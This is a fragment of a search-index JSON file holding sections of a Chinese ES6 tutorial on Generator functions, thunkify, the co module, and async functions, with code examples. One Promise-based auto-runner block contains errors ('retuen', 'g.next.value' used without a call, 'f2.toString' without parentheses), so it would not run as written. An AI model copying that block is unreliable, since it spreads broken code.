\u7684\u6e90\u7801\u4e0e\u4e0a\u4e00\u8282\u90a3\u4e2a\u7b80\u5355\u7684\u8f6c\u6362\u5668\u975e\u5e38\u50cf\u3002</p> <pre><code>function thunkify(fn) {\n  return function() {\n    var args = new Array(arguments.length);\n    var ctx = this;\n\n    for (var i = 0; i &lt; args.length; ++i) {\n      args[i] = arguments[i];\n    }\n\n    return function (done) {\n      var called;\n\n      args.push(function () {\n        if (called) return;\n        called = true;\n        done.apply(null, arguments);\n      });\n\n      try {\n        fn.apply(ctx, args);\n      } catch (err) {\n        done(err);\n      }\n    }\n  }\n};\n</code></pre> <p>\u5b83\u7684\u6e90\u7801\u4e3b\u8981\u591a\u4e86\u4e00\u4e2a\u68c0\u67e5\u673a\u5236\uff0c\u53d8\u91cf<code>called</code>\u786e\u4fdd\u56de\u8c03\u51fd\u6570\u53ea\u8fd0\u884c\u4e00\u6b21\u3002\u8fd9\u6837\u7684\u8bbe\u8ba1\u4e0e\u4e0b\u6587\u7684 Generator \u51fd\u6570\u76f8\u5173\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002</p> <pre><code>function f(a, b, callback){\n  var sum = a + b;\n  callback(sum);\n  callback(sum);\n}\n\nvar ft = thunkify(f);\nvar print = console.log.bind(console);\nft(1, 2)(print);\n// 3\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e<code>thunkify</code>\u53ea\u5141\u8bb8\u56de\u8c03\u51fd\u6570\u6267\u884c\u4e00\u6b21\uff0c\u6240\u4ee5\u53ea\u8f93\u51fa\u4e00\u884c\u7ed3\u679c\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#generator_2","title":"Generator \u51fd\u6570\u7684\u6d41\u7a0b\u7ba1\u7406","text":"<p>\u4f60\u53ef\u80fd\u4f1a\u95ee\uff0c Thunk \u51fd\u6570\u6709\u4ec0\u4e48\u7528\uff1fES6 \u6709\u4e86 Generator \u51fd\u6570\uff0cThunk \u51fd\u6570\u73b0\u5728\u53ef\u4ee5\u7528\u4e8e Generator \u51fd\u6570\u7684\u81ea\u52a8\u6d41\u7a0b\u7ba1\u7406\u3002</p> <p>Generator \u51fd\u6570\u53ef\u4ee5\u81ea\u52a8\u6267\u884c\u3002</p> <pre><code>function* gen() {\n  // ...\n}\n\nvar g = gen();\nvar res = g.next();\n\nwhile(!res.done){\n  console.log(res.value);\n  res = g.next();\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cGenerator \u51fd\u6570<code>gen</code>\u4f1a\u81ea\u52a8\u6267\u884c\u5b8c\u6240\u6709\u6b65\u9aa4\u3002</p> <p>\u4f46\u662f\uff0c\u8fd9\u4e0d\u9002\u5408\u5f02\u6b65\u64cd\u4f5c\u3002\u5982\u679c\u5fc5\u987b\u4fdd\u8bc1\u524d\u4e00\u6b65\u6267\u884c\u5b8c\uff0c\u624d\u80fd\u6267\u884c\u540e\u4e00\u6b65\uff0c\u4e0a\u9762\u7684\u81ea\u52a8\u6267\u884c\u5c31\u4e0d\u53ef\u884c\u3002\u8fd9\u65f6\uff0cThunk \u51fd\u6570\u5c31\u80fd\u6d3e\u4e0a\u7528\u5904\u3002\u4ee5\u8bfb\u53d6\u6587\u4ef6\u4e3a\u4f8b\u3002\u4e0b\u9762\u7684 Generator \u51fd\u6570\u5c01\u88c5\u4e86\u4e24\u4e2a\u5f02\u6b65\u64cd\u4f5c\u3002</p> <pre><code>var fs = require('fs');\nvar thunkify = require('thunkify');\nvar readFileThunk = thunkify(fs.readFile);\n\nvar gen = function* (){\n  var r1 = yield readFileThunk('/etc/fstab');\n  console.log(r1.toString());\n  var r2 = yield readFileThunk('/etc/shells');\n  console.log(r2.toString());\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>yield</code>\u547d\u4ee4\u7528\u4e8e\u5c06\u7a0b\u5e8f\u7684\u6267\u884c\u6743\u79fb\u51fa Generator \u51fd\u6570\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\uff0c\u5c06\u6267\u884c\u6743\u518d\u4ea4\u8fd8\u7ed9 Generator \u51fd\u6570\u3002</p> <p>\u8fd9\u79cd\u65b9\u6cd5\u5c31\u662f Thunk \u51fd\u6570\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u5728\u56de\u8c03\u51fd\u6570\u91cc\uff0c\u5c06\u6267\u884c\u6743\u4ea4\u8fd8\u7ed9 Generator \u51fd\u6570\u3002\u4e3a\u4e86\u4fbf\u4e8e\u7406\u89e3\uff0c\u6211\u4eec\u5148\u770b\u5982\u4f55\u624b\u52a8\u6267\u884c\u4e0a\u9762\u8fd9\u4e2a Generator \u51fd\u6570\u3002</p> <pre><code>var g = gen();\n\nvar r1 = g.next();\nr1.value(function (err, data) {\n  if (err) throw err;\n  var r2 = g.next(data);\n  r2.value(function (err, data) {\n    if (err) throw err;\n    g.next(data);\n  });\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf<code>g</code>\u662f Generator \u51fd\u6570\u7684\u5185\u90e8\u6307\u9488\uff0c\u8868\u793a\u76ee\u524d\u6267\u884c\u5230\u54ea\u4e00\u6b65\u3002<code>next</code>\u65b9\u6cd5\u8d1f\u8d23\u5c06\u6307\u9488\u79fb\u52a8\u5230\u4e0b\u4e00\u6b65\uff0c\u5e76\u8fd4\u56de\u8be5\u6b65\u7684\u4fe1\u606f\uff08<code>value</code>\u5c5e\u6027\u548c<code>done</code>\u5c5e\u6027\uff09\u3002</p> <p>\u4ed4\u7ec6\u67e5\u770b\u4e0a\u9762\u7684\u4ee3\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0 Generator \u51fd\u6570\u7684\u6267\u884c\u8fc7\u7a0b\uff0c\u5176\u5b9e\u662f\u5c06\u540c\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u53cd\u590d\u4f20\u5165<code>next</code>\u65b9\u6cd5\u7684<code>value</code>\u5c5e\u6027\u3002\u8fd9\u4f7f\u5f97\u6211\u4eec\u53ef\u4ee5\u7528\u9012\u5f52\u6765\u81ea\u52a8\u5b8c\u6210\u8fd9\u4e2a\u8fc7\u7a0b\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#thunk_1","title":"Thunk \u51fd\u6570\u7684\u81ea\u52a8\u6d41\u7a0b\u7ba1\u7406","text":"<p>Thunk \u51fd\u6570\u771f\u6b63\u7684\u5a01\u529b\uff0c\u5728\u4e8e\u53ef\u4ee5\u81ea\u52a8\u6267\u884c Generator \u51fd\u6570\u3002\u4e0b\u9762\u5c31\u662f\u4e00\u4e2a\u57fa\u4e8e Thunk \u51fd\u6570\u7684 Generator \u6267\u884c\u5668\u3002</p> <pre><code>function run(fn) {\n  var gen = fn();\n\n  function next(err, data) {\n    var result = gen.next(data);\n    if (result.done) return;\n    result.value(next);\n  }\n  next();\n}\n\nfunction* g() {\n  // ...\n}\n\nrun(g);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684<code>run</code>\u51fd\u6570\uff0c\u5c31\u662f\u4e00\u4e2a Generator \u51fd\u6570\u7684\u81ea\u52a8\u6267\u884c\u5668\u3002\u5185\u90e8\u7684<code>next</code>\u51fd\u6570\u5c31\u662f Thunk \u7684\u56de\u8c03\u51fd\u6570\u3002<code>next</code>\u51fd\u6570\u5148\u5c06\u6307\u9488\u79fb\u5230 Generator \u51fd\u6570\u7684\u4e0b\u4e00\u6b65\uff08<code>gen.next</code>\u65b9\u6cd5\uff09\uff0c\u7136\u540e\u5224\u65ad Generator \u51fd\u6570\u662f\u5426\u7ed3\u675f\uff08<code>result.done</code>\u5c5e\u6027\uff09\uff0c\u5982\u679c\u6ca1\u7ed3\u675f\uff0c\u5c31\u5c06<code>next</code>\u51fd\u6570\u518d\u4f20\u5165 Thunk \u51fd\u6570\uff08<code>result.value</code>\u5c5e\u6027\uff09\uff0c\u5426\u5219\u5c31\u76f4\u63a5\u9000\u51fa\u3002</p> <p>\u6709\u4e86\u8fd9\u4e2a\u6267\u884c\u5668\uff0c\u6267\u884c Generator \u51fd\u6570\u65b9\u4fbf\u591a\u4e86\u3002\u4e0d\u7ba1\u5185\u90e8\u6709\u591a\u5c11\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u76f4\u63a5\u628a Generator \u51fd\u6570\u4f20\u5165<code>run</code>\u51fd\u6570\u5373\u53ef\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f\u6bcf\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\uff0c\u90fd\u8981\u662f Thunk \u51fd\u6570\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u8ddf\u5728<code>yield</code>\u547d\u4ee4\u540e\u9762\u7684\u5fc5\u987b\u662f Thunk \u51fd\u6570\u3002</p> <pre><code>var g = function* (){\n  var f1 = yield readFileThunk('fileA');\n  var f2 = yield readFileThunk('fileB');\n  // ...\n  var fn = yield readFileThunk('fileN');\n};\n\nrun(g);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u51fd\u6570<code>g</code>\u5c01\u88c5\u4e86<code>n</code>\u4e2a\u5f02\u6b65\u7684\u8bfb\u53d6\u6587\u4ef6\u64cd\u4f5c\uff0c\u53ea\u8981\u6267\u884c<code>run</code>\u51fd\u6570\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u5c31\u4f1a\u81ea\u52a8\u5b8c\u6210\u3002\u8fd9\u6837\u4e00\u6765\uff0c\u5f02\u6b65\u64cd\u4f5c\u4e0d\u4ec5\u53ef\u4ee5\u5199\u5f97\u50cf\u540c\u6b65\u64cd\u4f5c\uff0c\u800c\u4e14\u4e00\u884c\u4ee3\u7801\u5c31\u53ef\u4ee5\u6267\u884c\u3002</p> <p>Thunk \u51fd\u6570\u5e76\u4e0d\u662f Generator \u51fd\u6570\u81ea\u52a8\u6267\u884c\u7684\u552f\u4e00\u65b9\u6848\u3002\u56e0\u4e3a\u81ea\u52a8\u6267\u884c\u7684\u5173\u952e\u662f\uff0c\u5fc5\u987b\u6709\u4e00\u79cd\u673a\u5236\uff0c\u81ea\u52a8\u63a7\u5236 Generator \u51fd\u6570\u7684\u6d41\u7a0b\uff0c\u63a5\u6536\u548c\u4ea4\u8fd8\u7a0b\u5e8f\u7684\u6267\u884c\u6743\u3002\u56de\u8c03\u51fd\u6570\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\uff0cPromise \u5bf9\u8c61\u4e5f\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#4co","title":"4\u3001co \u6a21\u5757","text":""},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#_7","title":"\u7528\u6cd5","text":"<p>co \u6a21\u5757\u7528\u4e8e Generator \u51fd\u6570\u7684\u81ea\u52a8\u6267\u884c\u3002</p> <p>\u4e0b\u9762\u662f\u4e00\u4e2a Generator \u51fd\u6570\uff0c\u7528\u4e8e\u4f9d\u6b21\u8bfb\u53d6\u4e24\u4e2a\u6587\u4ef6\u3002</p> <pre><code>var gen = function* () {\n  var f1 = yield readFile('/etc/fstab');\n  var f2 = yield readFile('/etc/shells');\n  console.log(f1.toString());\n  console.log(f2.toString());\n};\n</code></pre> <p>co \u6a21\u5757\u53ef\u4ee5\u8ba9\u4f60\u4e0d\u7528\u7f16\u5199 Generator \u51fd\u6570\u7684\u6267\u884c\u5668\u3002</p> <pre><code>var co = require('co');\nco(gen);\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0cGenerator \u51fd\u6570\u53ea\u8981\u4f20\u5165<code>co</code>\u51fd\u6570\uff0c\u5c31\u4f1a\u81ea\u52a8\u6267\u884c\u3002</p> <p><code>co</code>\u51fd\u6570\u8fd4\u56de\u4e00\u4e2a<code>Promise</code>\u5bf9\u8c61\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528<code>then</code>\u65b9\u6cd5\u6dfb\u52a0\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>co(gen).then(function (){\n  console.log('Generator \u51fd\u6570\u6267\u884c\u5b8c\u6210');\n});\n</code></pre>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#co","title":"co \u6a21\u5757\u7684\u539f\u7406","text":"<p>\u4e3a\u4ec0\u4e48 co \u53ef\u4ee5\u81ea\u52a8\u6267\u884c Generator \u51fd\u6570\uff1f</p> <p>\u524d\u9762\u8bf4\u8fc7\uff0cGenerator \u5c31\u662f\u4e00\u4e2a\u5f02\u6b65\u64cd\u4f5c\u7684\u5bb9\u5668\u3002\u5b83\u7684\u81ea\u52a8\u6267\u884c\u9700\u8981\u4e00\u79cd\u673a\u5236\uff0c\u5f53\u5f02\u6b65\u64cd\u4f5c\u6709\u4e86\u7ed3\u679c\uff0c\u80fd\u591f\u81ea\u52a8\u4ea4\u56de\u6267\u884c\u6743\u3002</p> <p>\u4e24\u79cd\u65b9\u6cd5\u53ef\u4ee5\u505a\u5230\u8fd9\u4e00\u70b9\u3002</p> <p>\uff081\uff09\u56de\u8c03\u51fd\u6570\u3002\u5c06\u5f02\u6b65\u64cd\u4f5c\u5305\u88c5\u6210 Thunk \u51fd\u6570\uff0c\u5728\u56de\u8c03\u51fd\u6570\u91cc\u9762\u4ea4\u56de\u6267\u884c\u6743\u3002</p> <p>\uff082\uff09Promise \u5bf9\u8c61\u3002\u5c06\u5f02\u6b65\u64cd\u4f5c\u5305\u88c5\u6210 Promise \u5bf9\u8c61\uff0c\u7528<code>then</code>\u65b9\u6cd5\u4ea4\u56de\u6267\u884c\u6743\u3002</p> <p>co \u6a21\u5757\u5176\u5b9e\u5c31\u662f\u5c06\u4e24\u79cd\u81ea\u52a8\u6267\u884c\u5668\uff08Thunk \u51fd\u6570\u548c Promise \u5bf9\u8c61\uff09\uff0c\u5305\u88c5\u6210\u4e00\u4e2a\u6a21\u5757\u3002\u4f7f\u7528 co \u7684\u524d\u63d0\u6761\u4ef6\u662f\uff0cGenerator \u51fd\u6570\u7684<code>yield</code>\u547d\u4ee4\u540e\u9762\uff0c\u53ea\u80fd\u662f Thunk \u51fd\u6570\u6216 Promise \u5bf9\u8c61\u3002\u5982\u679c\u6570\u7ec4\u6216\u5bf9\u8c61\u7684\u6210\u5458\uff0c\u5168\u90e8\u90fd\u662f Promise \u5bf9\u8c61\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 co\uff0c\u8be6\u89c1\u540e\u6587\u7684\u4f8b\u5b50\u3002</p> <p>\u4e0a\u4e00\u8282\u5df2\u7ecf\u4ecb\u7ecd\u4e86\u57fa\u4e8e Thunk \u51fd\u6570\u7684\u81ea\u52a8\u6267\u884c\u5668\u3002\u4e0b\u9762\u6765\u770b\uff0c\u57fa\u4e8e Promise \u5bf9\u8c61\u7684\u81ea\u52a8\u6267\u884c\u5668\u3002\u8fd9\u662f\u7406\u89e3 co \u6a21\u5757\u5fc5\u987b\u7684\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#promise_1","title":"\u57fa\u4e8e Promise \u5bf9\u8c61\u7684\u81ea\u52a8\u6267\u884c","text":"<p>\u8fd8\u662f\u6cbf\u7528\u4e0a\u9762\u7684\u4f8b\u5b50\u3002\u9996\u5148\uff0c\u628a<code>fs</code>\u6a21\u5757\u7684<code>readFile</code>\u65b9\u6cd5\u5305\u88c5\u6210\u4e00\u4e2a Promise \u5bf9\u8c61\u3002</p> <pre><code>var fs = require('fs');\nvar readFile = function(fileName) {\n  return new Promise((resolve, reject) =&gt; {\n    fs.readFile(fileName, (error, data) =&gt; {\n      if (error) return reject(error);\n      resolve(data);\n    });\n  });\n};\n\n// \u521b\u5efa\u751f\u6210\u5668\u51fd\u6570\nvar gen = function* () {\n  var f1 = yield readFile('path1');\n  var f2 = yield readFile('path2');\n  console.log(f1.toString(), f2.toString);\n};\n\n// \u624b\u52a8\u6267\u884c\u51fd\u6570\uff1a\u591a\u5c42\u56de\u8c03\u51fd\u6570\nvar g = gen();\ng.next.value.then((data) =&gt; {\n  g.next(data).value.then((data) =&gt; {\n    g.next(data);\n  });\n});\n\n// \u81ea\u52a8\u6267\u884c\u51fd\u6570\nfunction run(gen) {\n  var g = gen();\n  function next(data) {\n    var result = g.next(data);\n    if (result.done) retuen result.value;\n    // \u53ea\u8981 Generator \u51fd\u6570\u8fd8\u6ca1\u6267\u884c\u5230\u6700\u540e\u4e00\u6b65\uff0cnext\u51fd\u6570\u5c31\u8c03\u7528\u81ea\u8eab\uff0c\u4ee5\u6b64\u5b9e\u73b0\u81ea\u52a8\u6267\u884c\u3002\n    result.value.then((data) =&gt; {\n      next(data);\n    });\n  }\n  next();\n}\nrun(gen);\n</code></pre>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#co_1","title":"co \u6a21\u5757\u7684\u6e90\u7801","text":"<p>co \u5c31\u662f\u4e0a\u9762\u90a3\u4e2a\u81ea\u52a8\u6267\u884c\u5668\u7684\u6269\u5c55\uff0c\u5b83\u7684\u6e90\u7801\u53ea\u6709\u51e0\u5341\u884c\uff0c\u975e\u5e38\u7b80\u5355\u3002</p> <p>\u9996\u5148\uff0cco \u51fd\u6570\u63a5\u53d7 Generator \u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\u3002</p> <pre><code>function co(gen) {\n  var ctx = this;\n\n  return new Promise(function(resolve, reject) {\n  });\n}\n</code></pre> <p>\u5728\u8fd4\u56de\u7684 Promise \u5bf9\u8c61\u91cc\u9762\uff0cco \u5148\u68c0\u67e5\u53c2\u6570<code>gen</code>\u662f\u5426\u4e3a Generator \u51fd\u6570\u3002\u5982\u679c\u662f\uff0c\u5c31\u6267\u884c\u8be5\u51fd\u6570\uff0c\u5f97\u5230\u4e00\u4e2a\u5185\u90e8\u6307\u9488\u5bf9\u8c61\uff1b\u5982\u679c\u4e0d\u662f\u5c31\u8fd4\u56de\uff0c\u5e76\u5c06 Promise \u5bf9\u8c61\u7684\u72b6\u6001\u6539\u4e3a<code>resolved</code>\u3002</p> <pre><code>function co(gen) {\n  var ctx = this;\n\n  return new Promise(function(resolve, reject) {\n    if (typeof gen === 'function') gen = gen.call(ctx);\n    if (!gen || typeof gen.next !== 'function') return resolve(gen);\n  });\n}\n</code></pre> <p>\u63a5\u7740\uff0cco \u5c06 Generator \u51fd\u6570\u7684\u5185\u90e8\u6307\u9488\u5bf9\u8c61\u7684<code>next</code>\u65b9\u6cd5\uff0c\u5305\u88c5\u6210<code>onFulfilled</code>\u51fd\u6570\u3002\u8fd9\u4e3b\u8981\u662f\u4e3a\u4e86\u80fd\u591f\u6355\u6349\u629b\u51fa\u7684\u9519\u8bef\u3002</p> <pre><code>function co(gen) {\n  var ctx = this;\n\n  return new Promise(function(resolve, reject) {\n    if (typeof gen === 'function') gen = gen.call(ctx);\n    if (!gen || typeof gen.next !== 'function') return resolve(gen);\n\n    onFulfilled();\n    function onFulfilled(res) {\n      var ret;\n      try {\n        ret = gen.next(res);\n      } catch (e) {\n        return reject(e);\n      }\n      next(ret);\n    }\n  });\n}\n</code></pre> <p>\u6700\u540e\uff0c\u5c31\u662f\u5173\u952e\u7684<code>next</code>\u51fd\u6570\uff0c\u5b83\u4f1a\u53cd\u590d\u8c03\u7528\u81ea\u8eab\u3002</p> <pre><code>function next(ret) {\n  if (ret.done) return resolve(ret.value);\n  var value = toPromise.call(ctx, ret.value);\n  if (value &amp;&amp; isPromise(value)) return value.then(onFulfilled, onRejected);\n  return onRejected(\n    new TypeError(\n      'You may only yield a function, promise, generator, array, or object, '\n      + 'but the following object was passed: \"'\n      + String(ret.value)\n      + '\"'\n    )\n  );\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>next</code>\u51fd\u6570\u7684\u5185\u90e8\u4ee3\u7801\uff0c\u4e00\u5171\u53ea\u6709\u56db\u884c\u547d\u4ee4\u3002</p> <p>\u7b2c\u4e00\u884c\uff0c\u68c0\u67e5\u5f53\u524d\u662f\u5426\u4e3a Generator \u51fd\u6570\u7684\u6700\u540e\u4e00\u6b65\uff0c\u5982\u679c\u662f\u5c31\u8fd4\u56de\u3002</p> <p>\u7b2c\u4e8c\u884c\uff0c\u786e\u4fdd\u6bcf\u4e00\u6b65\u7684\u8fd4\u56de\u503c\uff0c\u662f Promise \u5bf9\u8c61\u3002</p> <p>\u7b2c\u4e09\u884c\uff0c\u4f7f\u7528<code>then</code>\u65b9\u6cd5\uff0c\u4e3a\u8fd4\u56de\u503c\u52a0\u4e0a\u56de\u8c03\u51fd\u6570\uff0c\u7136\u540e\u901a\u8fc7<code>onFulfilled</code>\u51fd\u6570\u518d\u6b21\u8c03\u7528<code>next</code>\u51fd\u6570\u3002</p> <p>\u7b2c\u56db\u884c\uff0c\u5728\u53c2\u6570\u4e0d\u7b26\u5408\u8981\u6c42\u7684\u60c5\u51b5\u4e0b\uff08\u53c2\u6570\u975e Thunk \u51fd\u6570\u548c Promise \u5bf9\u8c61\uff09\uff0c\u5c06 Promise \u5bf9\u8c61\u7684\u72b6\u6001\u6539\u4e3a<code>rejected</code>\uff0c\u4ece\u800c\u7ec8\u6b62\u6267\u884c\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#_8","title":"\u5904\u7406\u5e76\u53d1\u7684\u5f02\u6b65\u64cd\u4f5c","text":"<p>co \u652f\u6301\u5e76\u53d1\u7684\u5f02\u6b65\u64cd\u4f5c\uff0c\u5373\u5141\u8bb8\u67d0\u4e9b\u64cd\u4f5c\u540c\u65f6\u8fdb\u884c\uff0c\u7b49\u5230\u5b83\u4eec\u5168\u90e8\u5b8c\u6210\uff0c\u624d\u8fdb\u884c\u4e0b\u4e00\u6b65\u3002</p> <p>\u8fd9\u65f6\uff0c\u8981\u628a\u5e76\u53d1\u7684\u64cd\u4f5c\u90fd\u653e\u5728\u6570\u7ec4\u6216\u5bf9\u8c61\u91cc\u9762\uff0c\u8ddf\u5728<code>yield</code>\u8bed\u53e5\u540e\u9762\u3002</p> <pre><code>// \u6570\u7ec4\u7684\u5199\u6cd5\nco(function* () {\n  var res = yield [\n    Promise.resolve(1),\n    Promise.resolve(2)\n  ];\n  console.log(res);\n}).catch(onerror);\n\n// \u5bf9\u8c61\u7684\u5199\u6cd5\nco(function* () {\n  var res = yield {\n    1: Promise.resolve(1),\n    2: Promise.resolve(2),\n  };\n  console.log(res);\n}).catch(onerror);\n</code></pre> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>co(function* () {\n  var values = [n1, n2, n3];\n  yield values.map(somethingAsync);\n});\n\nfunction* somethingAsync(x) {\n  // do something async\n  return y\n}\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u5141\u8bb8\u5e76\u53d1\u4e09\u4e2a<code>somethingAsync</code>\u5f02\u6b65\u64cd\u4f5c\uff0c\u7b49\u5230\u5b83\u4eec\u5168\u90e8\u5b8c\u6210\uff0c\u624d\u4f1a\u8fdb\u884c\u4e0b\u4e00\u6b65\u3002</p>"},{"location":"ebook-JSES6-RYF/19-Generator%E5%BC%82%E6%AD%A5%E5%BA%94%E7%94%A8/#stream","title":"\u5b9e\u4f8b\uff1a\u5904\u7406 Stream","text":"<p>Node \u63d0\u4f9b Stream \u6a21\u5f0f\u8bfb\u5199\u6570\u636e\uff0c\u7279\u70b9\u662f\u4e00\u6b21\u53ea\u5904\u7406\u6570\u636e\u7684\u4e00\u90e8\u5206\uff0c\u6570\u636e\u5206\u6210\u4e00\u5757\u5757\u4f9d\u6b21\u5904\u7406\uff0c\u5c31\u597d\u50cf\u201c\u6570\u636e\u6d41\u201d\u4e00\u6837\u3002\u8fd9\u5bf9\u4e8e\u5904\u7406\u5927\u89c4\u6a21\u6570\u636e\u975e\u5e38\u6709\u5229\u3002Stream \u6a21\u5f0f\u4f7f\u7528 EventEmitter API\uff0c\u4f1a\u91ca\u653e\u4e09\u4e2a\u4e8b\u4ef6\u3002</p> <ul> <li><code>data</code>\u4e8b\u4ef6\uff1a\u4e0b\u4e00\u5757\u6570\u636e\u5757\u5df2\u7ecf\u51c6\u5907\u597d\u4e86\u3002</li> <li><code>end</code>\u4e8b\u4ef6\uff1a\u6574\u4e2a\u201c\u6570\u636e\u6d41\u201d\u5904\u7406\u5b8c\u4e86\u3002</li> <li><code>error</code>\u4e8b\u4ef6\uff1a\u53d1\u751f\u9519\u8bef\u3002</li> </ul> <p>\u4f7f\u7528<code>Promise.race()</code>\u51fd\u6570\uff0c\u53ef\u4ee5\u5224\u65ad\u8fd9\u4e09\u4e2a\u4e8b\u4ef6\u4e4b\u4e2d\u54ea\u4e00\u4e2a\u6700\u5148\u53d1\u751f\uff0c\u53ea\u6709\u5f53<code>data</code>\u4e8b\u4ef6\u6700\u5148\u53d1\u751f\u65f6\uff0c\u624d\u8fdb\u5165\u4e0b\u4e00\u4e2a\u6570\u636e\u5757\u7684\u5904\u7406\u3002\u4ece\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2a<code>while</code>\u5faa\u73af\uff0c\u5b8c\u6210\u6240\u6709\u6570\u636e\u7684\u8bfb\u53d6\u3002</p> <pre><code>const co = require('co');\nconst fs = require('fs');\n\nconst stream = fs.createReadStream('./les_miserables.txt');\nlet valjeanCount = 0;\n\nco(function*() {\n  while(true) {\n    const res = yield Promise.race([\n      new Promise(resolve =&gt; stream.once('data', resolve)),\n      new Promise(resolve =&gt; stream.once('end', resolve)),\n      new Promise((resolve, reject) =&gt; stream.once('error', reject))\n    ]);\n    if (!res) {\n      break;\n    }\n    stream.removeAllListeners('data');\n    stream.removeAllListeners('end');\n    stream.removeAllListeners('error');\n    valjeanCount += (res.toString().match(/valjean/ig) || []).length;\n  }\n  console.log('count:', valjeanCount); // count: 1120\n});\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u91c7\u7528 Stream \u6a21\u5f0f\u8bfb\u53d6\u300a\u60b2\u60e8\u4e16\u754c\u300b\u7684\u6587\u672c\u6587\u4ef6\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u6570\u636e\u5757\u90fd\u4f7f\u7528<code>stream.once</code>\u65b9\u6cd5\uff0c\u5728<code>data</code>\u3001<code>end</code>\u3001<code>error</code>\u4e09\u4e2a\u4e8b\u4ef6\u4e0a\u6dfb\u52a0\u4e00\u6b21\u6027\u56de\u8c03\u51fd\u6570\u3002\u53d8\u91cf<code>res</code>\u53ea\u6709\u5728<code>data</code>\u4e8b\u4ef6\u53d1\u751f\u65f6\u624d\u6709\u503c\uff0c\u7136\u540e\u7d2f\u52a0\u6bcf\u4e2a\u6570\u636e\u5757\u4e4b\u4e2d<code>valjean</code>\u8fd9\u4e2a\u8bcd\u51fa\u73b0\u7684\u6b21\u6570\u3002</p>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/","title":"async \u51fd\u6570","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 25603  \u9605\u8bfb52\u5206\u949f</p>"},{"location":"ebook-JSES6-RYF/20-async%20%E5%87%BD%E6%95%B0/#_1","title":"\u5f02\u6b65\u51fd\u6570","text":"<p>ES2017 \u6807\u51c6\u5f15\u5165\u4e86 async \u51fd\u6570\uff0c\u4f7f\u5f97\u5f02\u6b65\u64cd\u4f5c\u53d8\u5f97\u66f4\u52a0\u65b9\u4fbf\u3002async \u51fd\u6570\u662f Generator \u51fd\u6570\u7684\u8bed\u6cd5\u7cd6\u3002</p> <pre><code>// \u5c31\u662fgenerate\u751f\u6210\u5668\u51fd\u6570\u7684\u8bed\u6cd5\u7cd6\uff0c\u53ef\u4ee5\u66f4\u597d\u7406\u89e3\u7684\u5904\u7406\u5f02\u6b65\u51fd\u6570\nasync function fun(url) {\n  // \u5f02\u6b65\u64cd\u4f5c\u589e\u52a0 await \u53ef\u4ee5\u662f\u7f51\u7edc\u8bf7\u6c42\uff0c\u6216\u8005\u672c\u5730\u8bfb\u53d6\u6587\u4ef6 \n  let result = await fetch(url);\n  // this is async function, when get result, run then part. result will become res.\n  return result;\n}\n\n// \u8fd9\u4e2a\u53ef\u4ee5\u5728\u540c\u57df\u540d\u4e0b\u6d4b\u8bd5\u4f7f\u7528\uff0c\u5176\u4ed6\u57df\u540d\u4e0b\u4f1a\u62a5\u9519\nfun('https://www.baidu.com').then((res) =&gt; {\n  console.log(res);\n},(err) =&gt; {\n  console.log(err);\n});\n</code></pre> <pre><code>const fs = require('fs');\n\nconst readFile = function (fileName) {\n  return new Promise(function (resolve, reject) {\n    fs.readFile(fileName, function(error, data) {\n      if (error) return reject(error);\n      resolve(data);\n    });\n  });\n};\n\nconst gen = function* () {\n  const f1 = yield readFile('/etc/fstab');\n  const f2 = yield readFile('/etc/shells');\n  console.log(f1.toString());\n  console.log(f2.toString());\n};\n</code></pre> 